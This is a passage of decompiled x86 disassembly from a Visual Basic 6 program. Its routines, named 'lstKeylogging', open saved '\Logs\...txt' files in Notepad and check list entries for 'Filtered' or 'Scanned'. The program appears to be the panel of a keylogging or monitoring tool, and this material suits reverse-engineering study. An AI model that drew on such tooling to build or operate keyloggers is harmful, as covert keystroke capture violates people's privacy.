0074A03F: mov eax, var_000003D8
0074A045: mov eax, [eax]
0074A047: mov ecx, var_000003D8
0074A04D: mov ecx, [ecx]
0074A04F: mov ecx, [ecx]
0074A051: push eax
0074A052: call [ecx+0000032Ch]
0074A058: push eax
0074A059: lea eax, var_4C
0074A05C: push eax
0074A05D: call 00410A84h ; Set (object)
0074A062: push eax
0074A063: lea eax, var_00000144
0074A069: push eax
0074A06A: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
0074A06F: add esp, 00000010h
0074A072: push eax
0074A073: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
0074A078: push eax
0074A079: lea eax, var_50
0074A07C: push eax
0074A07D: call 00410A84h ; Set (object)
0074A082: mov var_00000338, eax
0074A088: lea eax, var_2C
0074A08B: push eax
0074A08C: mov eax, var_00000338
0074A092: mov eax, [eax]
0074A094: push var_00000338
0074A09A: call [eax+4Ch]
0074A09D: fclex 
0074A09F: mov var_0000033C, eax
0074A0A5: cmp var_0000033C, 00000000h
0074A0AC: jnl 74A0CEh
0074A0AE: push 0000004Ch
0074A0B0: push 004412DCh
0074A0B5: push var_00000338
0074A0BB: push var_0000033C
0074A0C1: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
0074A0C6: mov var_000003DC, eax
0074A0CC: jmp 74A0D5h
0074A0CE: and var_000003DC, 00000000h
0074A0D5: mov eax, var_2C
0074A0D8: mov var_00000378, eax
0074A0DE: and var_2C, 00000000h
0074A0E2: mov eax, var_00000378
0074A0E8: mov var_0000015C, eax
0074A0EE: mov var_00000164, 00000008h
0074A0F8: cmp [008F2010h], 00000000h
0074A0FF: jnz 74A11Ch
0074A101: push 008F2010h
0074A106: push 00433984h
0074A10B: call 00410A4Eh ; msvbvm60.dll.__vbaNew2
0074A110: mov var_000003E0, 008F2010h
0074A11A: jmp 74A126h
0074A11C: mov var_000003E0, 008F2010h
0074A126: push 00000010h
0074A128: pop eax
0074A129: call 004106A0h ; msvbvm60.dll.__vbaChkstk
0074A12E: lea esi, var_000002A4
0074A134: mov edi, esp
0074A136: movsd 
0074A137: movsd 
0074A138: movsd 
0074A139: movsd 
0074A13A: push 00000001h
0074A13C: push 00000010h
0074A13E: push 00440E58h
0074A143: push 00000010h
0074A145: pop eax
0074A146: call 004106A0h ; msvbvm60.dll.__vbaChkstk
0074A14B: lea esi, var_00000164
0074A151: mov edi, esp
0074A153: movsd 
0074A154: movsd 
0074A155: movsd 
0074A156: movsd 
0074A157: push 00000001h
0074A159: push 00000000h
0074A15B: push 00440E48h
0074A160: push 00000000h
0074A162: push 00000018h
0074A164: mov eax, var_000003E0
0074A16A: mov eax, [eax]
0074A16C: mov ecx, var_000003E0
0074A172: mov ecx, [ecx]
0074A174: mov ecx, [ecx]
0074A176: push eax
0074A177: call [ecx+00000550h]
0074A17D: push eax
0074A17E: lea eax, var_54
0074A181: push eax
0074A182: call 00410A84h ; Set (object)
0074A187: push eax
0074A188: lea eax, var_00000154
0074A18E: push eax
0074A18F: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
0074A194: add esp, 00000010h
0074A197: push eax
0074A198: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
0074A19D: push eax
0074A19E: lea eax, var_58
0074A1A1: push eax
0074A1A2: call 00410A84h ; Set (object)
0074A1A7: push eax
0074A1A8: lea eax, var_00000174
0074A1AE: push eax
0074A1AF: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
0074A1B4: add esp, 00000020h
0074A1B7: push eax
0074A1B8: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
0074A1BD: push eax
0074A1BE: lea eax, var_5C
0074A1C1: push eax
0074A1C2: call 00410A84h ; Set (object)
0074A1C7: push eax
0074A1C8: lea eax, var_00000184
0074A1CE: push eax
0074A1CF: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
0074A1D4: add esp, 00000020h
0074A1D7: push 004412DCh
0074A1DC: push 00000000h
0074A1DE: push 0000000Dh
0074A1E0: mov eax, [ebp+08h]
0074A1E3: mov eax, [eax]
0074A1E5: push [ebp+08h]
0074A1E8: call [eax+0000032Ch]
0074A1EE: push eax
0074A1EF: lea eax, var_60
0074A1F2: push eax
0074A1F3: call 00410A84h ; Set (object)
0074A1F8: push eax
0074A1F9: lea eax, var_000001C4
0074A1FF: push eax
0074A200: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
0074A205: add esp, 00000010h
0074A208: push eax
0074A209: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
0074A20E: push eax
0074A20F: lea eax, var_64
0074A212: push eax
0074A213: call 00410A84h ; Set (object)
0074A218: mov var_00000340, eax
0074A21E: lea eax, var_30
0074A221: push eax
0074A222: mov eax, var_00000340
0074A228: mov eax, [eax]
0074A22A: push var_00000340
0074A230: call [eax+4Ch]
0074A233: fclex 
0074A235: mov var_00000344, eax
0074A23B: cmp var_00000344, 00000000h
0074A242: jnl 74A264h
0074A244: push 0000004Ch
0074A246: push 004412DCh
0074A24B: push var_00000340
0074A251: push var_00000344
0074A257: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
0074A25C: mov var_000003E4, eax
0074A262: jmp 74A26Bh
0074A264: and var_000003E4, 00000000h
0074A26B: push var_30
0074A26E: call 004109DCh ; Val(arg_1)
0074A273: fstp real8 ptr var_0000031C
0074A279: push 00000020h
0074A27B: lea eax, var_000001F4
0074A281: push eax
0074A282: call 004108CEh ; arg_1 = arg_3 & Chr(arg_2)
0074A287: mov var_0000022C, 0044BA20h ; notepad
0074A291: mov var_00000234, 00000008h
0074A29B: mov eax, var_24
0074A29E: mov var_0000037C, eax
0074A2A4: and var_24, 00000000h
0074A2A8: mov eax, var_0000037C
0074A2AE: mov var_0000008C, eax
0074A2B4: mov var_00000094, 00000008h
0074A2BE: mov var_0000023C, 0044A818h ; \Logs\
0074A2C8: mov var_00000244, 00000008h
0074A2D2: lea eax, var_00000104
0074A2D8: push eax
0074A2D9: call 004109FAh ; msvbvm60.dll.__vbaStrVarMove
0074A2DE: mov var_0000010C, eax
0074A2E4: mov var_00000114, 00000008h
0074A2EE: mov var_0000027C, 004495B0h
0074A2F8: mov var_00000284, 00000008h
0074A302: lea eax, var_00000184
0074A308: push eax
0074A309: call 004109FAh ; msvbvm60.dll.__vbaStrVarMove
0074A30E: mov var_0000018C, eax
0074A314: mov var_00000194, 00000008h
0074A31E: mov var_000002BC, 0044A82Ch
0074A328: mov var_000002C4, 00000008h
0074A332: fld real8 ptr var_0000031C
0074A338: call 00410814h ; msvbvm60.dll.__vbaFpI4
0074A33D: push eax
0074A33E: push [008F2074h]
0074A344: call 0041093Ah ; msvbvm60.dll.__vbaDerefAry1
0074A349: mov eax, [eax]
0074A34B: mov var_000002CC, eax
0074A351: mov var_000002D4, 00000008h
0074A35B: mov var_000002DC, 0044A834h ; .txt
0074A365: mov var_000002E4, 00000008h
0074A36F: push 00000001h
0074A371: lea eax, var_00000234
0074A377: push eax
0074A378: lea eax, var_74
0074A37B: push eax
0074A37C: lea eax, var_00000084
0074A382: push eax
0074A383: call 004109F4h ; msvbvm60.dll.__vbaVarCat
0074A388: push eax
0074A389: lea eax, var_00000094
0074A38F: push eax
0074A390: lea eax, var_000000A4
0074A396: push eax
0074A397: call 004109F4h ; msvbvm60.dll.__vbaVarCat
0074A39C: push eax
0074A39D: lea eax, var_00000244
0074A3A3: push eax
0074A3A4: lea eax, var_000000B4
0074A3AA: push eax
0074A3AB: call 004109F4h ; msvbvm60.dll.__vbaVarCat
0074A3B0: push eax
0074A3B1: lea eax, var_00000114
0074A3B7: push eax
0074A3B8: lea eax, var_00000124
0074A3BE: push eax
0074A3BF: call 004109F4h ; msvbvm60.dll.__vbaVarCat
0074A3C4: push eax
0074A3C5: lea eax, var_00000284
0074A3CB: push eax
0074A3CC: lea eax, var_00000134
0074A3D2: push eax
0074A3D3: call 004109F4h ; msvbvm60.dll.__vbaVarCat
0074A3D8: push eax
0074A3D9: lea eax, var_00000194
0074A3DF: push eax
0074A3E0: lea eax, var_000001A4
0074A3E6: push eax
0074A3E7: call 004109F4h ; msvbvm60.dll.__vbaVarCat
0074A3EC: push eax
0074A3ED: lea eax, var_000002C4
0074A3F3: push eax
0074A3F4: lea eax, var_000001B4
0074A3FA: push eax
0074A3FB: call 004109F4h ; msvbvm60.dll.__vbaVarCat
0074A400: push eax
0074A401: lea eax, var_000002D4
0074A407: push eax
0074A408: lea eax, var_000001D4
0074A40E: push eax
0074A40F: call 004109F4h ; msvbvm60.dll.__vbaVarCat
0074A414: push eax
0074A415: lea eax, var_000002E4
0074A41B: push eax
0074A41C: lea eax, var_000001E4
0074A422: push eax
0074A423: call 004109F4h ; msvbvm60.dll.__vbaVarCat
0074A428: push eax
0074A429: lea eax, var_000001F4
0074A42F: push eax
0074A430: lea eax, var_00000204
0074A436: push eax
0074A437: call 004109F4h ; msvbvm60.dll.__vbaVarCat
0074A43C: push eax
0074A43D: call 00410A96h ; Shell
0074A442: fstp real8 ptr var_00000314
0074A448: lea ecx, var_30
0074A44B: call 00410A66h ; msvbvm60.dll.__vbaFreeStr
0074A450: lea eax, var_64
0074A453: push eax
0074A454: lea eax, var_60
0074A457: push eax
0074A458: lea eax, var_5C
0074A45B: push eax
0074A45C: lea eax, var_58
0074A45F: push eax
0074A460: lea eax, var_54
0074A463: push eax
0074A464: lea eax, var_50
0074A467: push eax
0074A468: lea eax, var_4C
0074A46B: push eax
0074A46C: lea eax, var_48
0074A46F: push eax
0074A470: lea eax, var_44
0074A473: push eax
0074A474: lea eax, var_40
0074A477: push eax
0074A478: lea eax, var_3C
0074A47B: push eax
0074A47C: lea eax, var_38
0074A47F: push eax
0074A480: lea eax, var_34
0074A483: push eax
0074A484: push 0000000Dh
0074A486: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
0074A48B: add esp, 00000038h
0074A48E: lea eax, var_00000204
0074A494: push eax
0074A495: lea eax, var_000001F4
0074A49B: push eax
0074A49C: lea eax, var_000001E4
0074A4A2: push eax
0074A4A3: lea eax, var_000001D4
0074A4A9: push eax
0074A4AA: lea eax, var_000001B4
0074A4B0: push eax
0074A4B1: lea eax, var_000001C4
0074A4B7: push eax
0074A4B8: lea eax, var_000001A4
0074A4BE: push eax
0074A4BF: lea eax, var_00000194
0074A4C5: push eax
0074A4C6: lea eax, var_00000134
0074A4CC: push eax
0074A4CD: lea eax, var_00000184
0074A4D3: push eax
0074A4D4: lea eax, var_00000174
0074A4DA: push eax
0074A4DB: lea eax, var_00000164
0074A4E1: push eax
0074A4E2: lea eax, var_00000154
0074A4E8: push eax
0074A4E9: lea eax, var_00000144
0074A4EF: push eax
0074A4F0: lea eax, var_00000124
0074A4F6: push eax
0074A4F7: lea eax, var_00000114
0074A4FD: push eax
0074A4FE: lea eax, var_000000B4
0074A504: push eax
0074A505: lea eax, var_00000104
0074A50B: push eax
0074A50C: lea eax, var_000000F4
0074A512: push eax
0074A513: lea eax, var_000000E4
0074A519: push eax
0074A51A: lea eax, var_000000D4
0074A520: push eax
0074A521: lea eax, var_000000C4
0074A527: push eax
0074A528: lea eax, var_000000A4
0074A52E: push eax
0074A52F: lea eax, var_00000094
0074A535: push eax
0074A536: lea eax, var_00000084
0074A53C: push eax
0074A53D: lea eax, var_74
0074A540: push eax
0074A541: push 0000001Ah
0074A543: call 00410A42h ; msvbvm60.dll.__vbaFreeVarList
0074A548: add esp, 0000006Ch
0074A54B: mov var_04, 0000000Ah
0074A552: mov eax, [ebp+0Ch]
0074A555: cmp word ptr [eax], 001Bh
0074A559: jnz 0074A600h
0074A55F: mov var_04, 0000000Bh
0074A566: cmp [008F529Ch], 00000000h
0074A56D: jnz 74A58Ah
0074A56F: push 008F529Ch
0074A574: push 00440F2Ch
0074A579: call 00410A4Eh ; msvbvm60.dll.__vbaNew2
0074A57E: mov var_000003E8, 008F529Ch
0074A588: jmp 74A594h
0074A58A: mov var_000003E8, 008F529Ch
0074A594: mov eax, var_000003E8
0074A59A: mov eax, [eax]
0074A59C: mov var_00000320, eax
0074A5A2: push [ebp+08h]
0074A5A5: lea eax, var_34
0074A5A8: push eax
0074A5A9: call 004108E0h ; msvbvm60.dll.__vbaObjSetAddref
0074A5AE: push eax
0074A5AF: mov eax, var_00000320
0074A5B5: mov eax, [eax]
0074A5B7: push var_00000320
0074A5BD: call [eax+10h]
0074A5C0: fclex 
0074A5C2: mov var_00000324, eax
0074A5C8: cmp var_00000324, 00000000h
0074A5CF: jnl 74A5F1h
0074A5D1: push 00000010h
0074A5D3: push 00440F1Ch
0074A5D8: push var_00000320
0074A5DE: push var_00000324
0074A5E4: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
0074A5E9: mov var_000003EC, eax
0074A5EF: jmp 74A5F8h
0074A5F1: and var_000003EC, 00000000h
0074A5F8: lea ecx, var_34
0074A5FB: call 00410A7Eh ; msvbvm60.dll.__vbaFreeObj
0074A600: mov var_10, 00000000h
0074A607: wait 
0074A608: push 0074A737h
0074A60D: jmp 0074A736h
0074A612: lea eax, var_30
0074A615: push eax
0074A616: lea eax, var_2C
0074A619: push eax
0074A61A: lea eax, var_28
0074A61D: push eax
0074A61E: lea eax, var_24
0074A621: push eax
0074A622: push 00000004h
0074A624: call 00410A12h ; msvbvm60.dll.__vbaFreeStrList
0074A629: add esp, 00000014h
0074A62C: lea eax, var_64
0074A62F: push eax
0074A630: lea eax, var_60
0074A633: push eax
0074A634: lea eax, var_5C
0074A637: push eax
0074A638: lea eax, var_58
0074A63B: push eax
0074A63C: lea eax, var_54
0074A63F: push eax
0074A640: lea eax, var_50
0074A643: push eax
0074A644: lea eax, var_4C
0074A647: push eax
0074A648: lea eax, var_48
0074A64B: push eax
0074A64C: lea eax, var_44
0074A64F: push eax
0074A650: lea eax, var_40
0074A653: push eax
0074A654: lea eax, var_3C
0074A657: push eax
0074A658: lea eax, var_38
0074A65B: push eax
0074A65C: lea eax, var_34
0074A65F: push eax
0074A660: push 0000000Dh
0074A662: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
0074A667: add esp, 00000038h
0074A66A: lea eax, var_00000224
0074A670: push eax
0074A671: lea eax, var_00000214
0074A677: push eax
0074A678: lea eax, var_00000204
0074A67E: push eax
0074A67F: lea eax, var_000001F4
0074A685: push eax
0074A686: lea eax, var_000001E4
0074A68C: push eax
0074A68D: lea eax, var_000001D4
0074A693: push eax
0074A694: lea eax, var_000001C4
0074A69A: push eax
0074A69B: lea eax, var_000001B4
0074A6A1: push eax
0074A6A2: lea eax, var_000001A4
0074A6A8: push eax
0074A6A9: lea eax, var_00000194
0074A6AF: push eax
0074A6B0: lea eax, var_00000184
0074A6B6: push eax
0074A6B7: lea eax, var_00000174
0074A6BD: push eax
0074A6BE: lea eax, var_00000164
0074A6C4: push eax
0074A6C5: lea eax, var_00000154
0074A6CB: push eax
0074A6CC: lea eax, var_00000144
0074A6D2: push eax
0074A6D3: lea eax, var_00000134
0074A6D9: push eax
0074A6DA: lea eax, var_00000124
0074A6E0: push eax
0074A6E1: lea eax, var_00000114
0074A6E7: push eax
0074A6E8: lea eax, var_00000104
0074A6EE: push eax
0074A6EF: lea eax, var_000000F4
0074A6F5: push eax
0074A6F6: lea eax, var_000000E4
0074A6FC: push eax
0074A6FD: lea eax, var_000000D4
0074A703: push eax
0074A704: lea eax, var_000000C4
0074A70A: push eax
0074A70B: lea eax, var_000000B4
0074A711: push eax
0074A712: lea eax, var_000000A4
0074A718: push eax
0074A719: lea eax, var_00000094
0074A71F: push eax
0074A720: lea eax, var_00000084
0074A726: push eax
0074A727: lea eax, var_74
0074A72A: push eax
0074A72B: push 0000001Ch
0074A72D: call 00410A42h ; msvbvm60.dll.__vbaFreeVarList
0074A732: add esp, 00000074h
0074A735: ret 
End Sub

Private sub lstKeylogging__74A756
0074A756: push ebp
0074A757: mov ebp, esp
0074A759: sub esp, 00000018h
0074A75C: push 004106A6h ; msvbvm60.dll.__vbaExceptHandler
0074A761: mov eax, fs:[00h]
0074A767: push eax
0074A768: mov fs:[00000000h], esp
0074A76F: push 00000064h
0074A771: pop eax
0074A772: call 004106A0h ; msvbvm60.dll.__vbaChkstk
0074A777: push ebx
0074A778: push esi
0074A779: push edi
0074A77A: mov var_18, esp
0074A77D: mov var_14, 00405A48h
0074A784: mov eax, [ebp+08h]
0074A787: and eax, 00000001h
0074A78A: mov var_10, eax
0074A78D: mov eax, [ebp+08h]
0074A790: and al, FEh
0074A792: mov [ebp+08h], eax
0074A795: mov var_0C, 00000000h
0074A79C: mov eax, [ebp+08h]
0074A79F: mov eax, [eax]
0074A7A1: push [ebp+08h]
0074A7A4: call [eax+04h]
0074A7A7: mov var_04, 00000001h
0074A7AE: mov var_04, 00000002h
0074A7B5: push FFFFFFFFh
0074A7B7: call 00410A60h ; On Error ...
0074A7BC: mov var_04, 00000003h
0074A7C3: mov eax, [ebp+0Ch]
0074A7C6: cmp word ptr [eax], 0002h
0074A7CA: jnz 0074A8B1h
0074A7D0: mov var_04, 00000004h
0074A7D7: mov var_60, 80020004h
0074A7DE: mov var_68, 0000000Ah
0074A7E5: mov var_50, 80020004h
0074A7EC: mov var_58, 0000000Ah
0074A7F3: mov var_40, 80020004h
0074A7FA: mov var_48, 0000000Ah
0074A801: mov var_30, 80020004h
0074A808: mov var_38, 0000000Ah
0074A80F: push 00000010h
0074A811: pop eax
0074A812: call 004106A0h ; msvbvm60.dll.__vbaChkstk
0074A817: lea esi, var_68
0074A81A: mov edi, esp
0074A81C: movsd 
0074A81D: movsd 
0074A81E: movsd 
0074A81F: movsd 
0074A820: push 00000010h
0074A822: pop eax
0074A823: call 004106A0h ; msvbvm60.dll.__vbaChkstk
0074A828: lea esi, var_58
0074A82B: mov edi, esp
0074A82D: movsd 
0074A82E: movsd 
0074A82F: movsd 
0074A830: movsd 
0074A831: push 00000010h
0074A833: pop eax
0074A834: call 004106A0h ; msvbvm60.dll.__vbaChkstk
0074A839: lea esi, var_48
0074A83C: mov edi, esp
0074A83E: movsd 
0074A83F: movsd 
0074A840: movsd 
0074A841: movsd 
0074A842: push 00000010h
0074A844: pop eax
0074A845: call 004106A0h ; msvbvm60.dll.__vbaChkstk
0074A84A: lea esi, var_38
0074A84D: mov edi, esp
0074A84F: movsd 
0074A850: movsd 
0074A851: movsd 
0074A852: movsd 
0074A853: mov eax, [ebp+08h]
0074A856: mov eax, [eax]
0074A858: push [ebp+08h]
0074A85B: call [eax+000002FCh]
0074A861: push eax
0074A862: lea eax, var_28
0074A865: push eax
0074A866: call 00410A84h ; Set (object)
0074A86B: push eax
0074A86C: mov eax, [ebp+08h]
0074A86F: mov eax, [eax]
0074A871: push [ebp+08h]
0074A874: call [eax+000002BCh]
0074A87A: fclex 
0074A87C: mov var_6C, eax
0074A87F: cmp var_6C, 00000000h
0074A883: jnl 74A8A2h
0074A885: push 000002BCh
0074A88A: push 00444B74h
0074A88F: push [ebp+08h]
0074A892: push var_6C
0074A895: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
0074A89A: mov var_00000084, eax
0074A8A0: jmp 74A8A9h
0074A8A2: and var_00000084, 00000000h
0074A8A9: lea ecx, var_28
0074A8AC: call 00410A7Eh ; msvbvm60.dll.__vbaFreeObj
0074A8B1: mov var_10, 00000000h
0074A8B8: push 0074A8D1h
0074A8BD: jmp 74A8C8h
0074A8BF: lea ecx, var_28
0074A8C2: call 00410A7Eh ; msvbvm60.dll.__vbaFreeObj
0074A8C7: ret 
End Sub

Private sub lstKeylogging__74798D
0074798D: push ebp
0074798E: mov ebp, esp
00747990: sub esp, 00000018h
00747993: push 004106A6h ; msvbvm60.dll.__vbaExceptHandler
00747998: mov eax, fs:[00h]
0074799E: push eax
0074799F: mov fs:[00000000h], esp
007479A6: mov eax, 000003C4h
007479AB: call 004106A0h ; msvbvm60.dll.__vbaChkstk
007479B0: push ebx
007479B1: push esi
007479B2: push edi
007479B3: mov var_18, esp
007479B6: mov var_14, 004059B0h
007479BD: mov eax, [ebp+08h]
007479C0: and eax, 00000001h
007479C3: mov var_10, eax
007479C6: mov eax, [ebp+08h]
007479C9: and al, FEh
007479CB: mov [ebp+08h], eax
007479CE: mov var_0C, 00000000h
007479D5: mov eax, [ebp+08h]
007479D8: mov eax, [eax]
007479DA: push [ebp+08h]
007479DD: call [eax+04h]
007479E0: mov var_04, 00000001h
007479E7: mov var_04, 00000002h
007479EE: push FFFFFFFFh
007479F0: call 00410A60h ; On Error ...
007479F5: mov var_04, 00000003h
007479FC: push 004412BCh
00747A01: push 00000000h
00747A03: push 00000007h
00747A05: mov eax, [ebp+08h]
00747A08: mov eax, [eax]
00747A0A: push [ebp+08h]
00747A0D: call [eax+0000032Ch]
00747A13: push eax
00747A14: lea eax, var_3C
00747A17: push eax
00747A18: call 00410A84h ; Set (object)
00747A1D: push eax
00747A1E: lea eax, var_00000084
00747A24: push eax
00747A25: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
00747A2A: add esp, 00000010h
00747A2D: push eax
00747A2E: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
00747A33: push eax
00747A34: lea eax, var_40
00747A37: push eax
00747A38: call 00410A84h ; Set (object)
00747A3D: mov var_00000328, eax
00747A43: push 004412DCh
00747A48: push 00000000h
00747A4A: push 0000000Dh
00747A4C: mov eax, [ebp+08h]
00747A4F: mov eax, [eax]
00747A51: push [ebp+08h]
00747A54: call [eax+0000032Ch]
00747A5A: push eax
00747A5B: lea eax, var_34
00747A5E: push eax
00747A5F: call 00410A84h ; Set (object)
00747A64: push eax
00747A65: lea eax, var_74
00747A68: push eax
00747A69: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
00747A6E: add esp, 00000010h
00747A71: push eax
00747A72: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
00747A77: push eax
00747A78: lea eax, var_38
00747A7B: push eax
00747A7C: call 00410A84h ; Set (object)
00747A81: mov var_00000320, eax
00747A87: lea eax, var_00000308
00747A8D: push eax
00747A8E: mov eax, var_00000320
00747A94: mov eax, [eax]
00747A96: push var_00000320
00747A9C: call [eax+44h]
00747A9F: fclex 
00747AA1: mov var_00000324, eax
00747AA7: cmp var_00000324, 00000000h
00747AAE: jnl 747AD0h
00747AB0: push 00000044h
00747AB2: push 004412DCh
00747AB7: push var_00000320
00747ABD: push var_00000324
00747AC3: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
00747AC8: mov var_00000380, eax
00747ACE: jmp 747AD7h
00747AD0: and var_00000380, 00000000h
00747AD7: mov eax, var_00000308
00747ADD: mov var_0000008C, eax
00747AE3: mov var_00000094, 00000003h
00747AED: lea eax, var_44
00747AF0: push eax
00747AF1: lea eax, var_00000094
00747AF7: push eax
00747AF8: mov eax, var_00000328
00747AFE: mov eax, [eax]
00747B00: push var_00000328
00747B06: call [eax+24h]
00747B09: fclex 
00747B0B: mov var_0000032C, eax
00747B11: cmp var_0000032C, 00000000h
00747B18: jnl 747B3Ah
00747B1A: push 00000024h
00747B1C: push 004412BCh
00747B21: push var_00000328
00747B27: push var_0000032C
00747B2D: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
00747B32: mov var_00000384, eax
00747B38: jmp 747B41h
00747B3A: and var_00000384, 00000000h
00747B41: mov eax, var_44
00747B44: mov var_00000330, eax
00747B4A: lea eax, var_24
00747B4D: push eax
00747B4E: push 00000006h
00747B50: mov eax, var_00000330
00747B56: mov eax, [eax]
00747B58: push var_00000330
00747B5E: call [eax+00000084h]
00747B64: fclex 
00747B66: mov var_00000334, eax
00747B6C: cmp var_00000334, 00000000h
00747B73: jnl 747B98h
00747B75: push 00000084h
00747B7A: push 004412DCh
00747B7F: push var_00000330
00747B85: push var_00000334
00747B8B: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
00747B90: mov var_00000388, eax
00747B96: jmp 747B9Fh
00747B98: and var_00000388, 00000000h
00747B9F: push 004412BCh
00747BA4: push 00000000h
00747BA6: push 00000007h
00747BA8: mov eax, [ebp+08h]
00747BAB: mov eax, [eax]
00747BAD: push [ebp+08h]
00747BB0: call [eax+0000032Ch]
00747BB6: push eax
00747BB7: lea eax, var_50
00747BBA: push eax
00747BBB: call 00410A84h ; Set (object)
00747BC0: push eax
00747BC1: lea eax, var_000000B4
00747BC7: push eax
00747BC8: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
00747BCD: add esp, 00000010h
00747BD0: push eax
00747BD1: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
00747BD6: push eax
00747BD7: lea eax, var_54
00747BDA: push eax
00747BDB: call 00410A84h ; Set (object)
00747BE0: mov var_00000340, eax
00747BE6: push 004412DCh
00747BEB: push 00000000h
00747BED: push 0000000Dh
00747BEF: mov eax, [ebp+08h]
00747BF2: mov eax, [eax]
00747BF4: push [ebp+08h]
00747BF7: call [eax+0000032Ch]
00747BFD: push eax
00747BFE: lea eax, var_48
00747C01: push eax
00747C02: call 00410A84h ; Set (object)
00747C07: push eax
00747C08: lea eax, var_000000A4
00747C0E: push eax
00747C0F: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
00747C14: add esp, 00000010h
00747C17: push eax
00747C18: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
00747C1D: push eax
00747C1E: lea eax, var_4C
00747C21: push eax
00747C22: call 00410A84h ; Set (object)
00747C27: mov var_00000338, eax
00747C2D: lea eax, var_0000030C
00747C33: push eax
00747C34: mov eax, var_00000338
00747C3A: mov eax, [eax]
00747C3C: push var_00000338
00747C42: call [eax+44h]
00747C45: fclex 
00747C47: mov var_0000033C, eax
00747C4D: cmp var_0000033C, 00000000h
00747C54: jnl 747C76h
00747C56: push 00000044h
00747C58: push 004412DCh
00747C5D: push var_00000338
00747C63: push var_0000033C
00747C69: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
00747C6E: mov var_0000038C, eax
00747C74: jmp 747C7Dh
00747C76: and var_0000038C, 00000000h
00747C7D: mov eax, var_0000030C
00747C83: mov var_000000BC, eax
00747C89: mov var_000000C4, 00000003h
00747C93: lea eax, var_58
00747C96: push eax
00747C97: lea eax, var_000000C4
00747C9D: push eax
00747C9E: mov eax, var_00000340
00747CA4: mov eax, [eax]
00747CA6: push var_00000340
00747CAC: call [eax+24h]
00747CAF: fclex 
00747CB1: mov var_00000344, eax
00747CB7: cmp var_00000344, 00000000h
00747CBE: jnl 747CE0h
00747CC0: push 00000024h
00747CC2: push 004412BCh
00747CC7: push var_00000340
00747CCD: push var_00000344
00747CD3: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
00747CD8: mov var_00000390, eax
00747CDE: jmp 747CE7h
00747CE0: and var_00000390, 00000000h
00747CE7: mov eax, var_58
00747CEA: mov var_00000348, eax
00747CF0: lea eax, var_28
00747CF3: push eax
00747CF4: push 00000006h
00747CF6: mov eax, var_00000348
00747CFC: mov eax, [eax]
00747CFE: push var_00000348
00747D04: call [eax+00000084h]
00747D0A: fclex 
00747D0C: mov var_0000034C, eax
00747D12: cmp var_0000034C, 00000000h
00747D19: jnl 747D3Eh
00747D1B: push 00000084h
00747D20: push 004412DCh
00747D25: push var_00000348
00747D2B: push var_0000034C
00747D31: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
00747D36: mov var_00000394, eax
00747D3C: jmp 747D45h
00747D3E: and var_00000394, 00000000h
00747D45: push var_24
00747D48: push 0044A524h ; Filtered
00747D4D: call 00410A00h ; msvbvm60.dll.__vbaStrCmp
00747D52: mov esi, eax
00747D54: neg esi
00747D56: sbb esi, esi
00747D58: inc esi
00747D59: neg esi
00747D5B: push var_28
00747D5E: push 0044A364h ; Scanned
00747D63: call 00410A00h ; msvbvm60.dll.__vbaStrCmp
00747D68: neg eax
00747D6A: sbb eax, eax
00747D6C: inc eax
00747D6D: neg eax
00747D6F: or si, ax
00747D72: mov var_00000350, si
00747D79: lea eax, var_28
00747D7C: push eax
00747D7D: lea eax, var_24
00747D80: push eax
00747D81: push 00000002h
00747D83: call 00410A12h ; msvbvm60.dll.__vbaFreeStrList
00747D88: add esp, 0000000Ch
00747D8B: lea eax, var_58
00747D8E: push eax
00747D8F: lea eax, var_54
00747D92: push eax
00747D93: lea eax, var_50
00747D96: push eax
00747D97: lea eax, var_4C
00747D9A: push eax
00747D9B: lea eax, var_48
00747D9E: push eax
00747D9F: lea eax, var_44
00747DA2: push eax
00747DA3: lea eax, var_40
00747DA6: push eax
00747DA7: lea eax, var_3C
00747DAA: push eax
00747DAB: lea eax, var_38
00747DAE: push eax
00747DAF: lea eax, var_34
00747DB2: push eax
00747DB3: push 0000000Ah
00747DB5: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
00747DBA: add esp, 0000002Ch
00747DBD: lea eax, var_000000C4
00747DC3: push eax
00747DC4: lea eax, var_000000B4
00747DCA: push eax
00747DCB: lea eax, var_000000A4
00747DD1: push eax
00747DD2: lea eax, var_00000094
00747DD8: push eax
00747DD9: lea eax, var_00000084
00747DDF: push eax
00747DE0: lea eax, var_74
00747DE3: push eax
00747DE4: push 00000006h
00747DE6: call 00410A42h ; msvbvm60.dll.__vbaFreeVarList
00747DEB: add esp, 0000001Ch
00747DEE: movsx eax, word ptr var_00000350
00747DF5: test eax, eax
00747DF7: jz 0074868Ch
00747DFD: mov var_04, 00000004h
00747E04: push 00000020h
00747E06: lea eax, var_74
00747E09: push eax
00747E0A: call 004108CEh ; arg_1 = arg_3 & Chr(arg_2)
00747E0F: cmp [008F529Ch], 00000000h
00747E16: jnz 747E33h
00747E18: push 008F529Ch
00747E1D: push 00440F2Ch
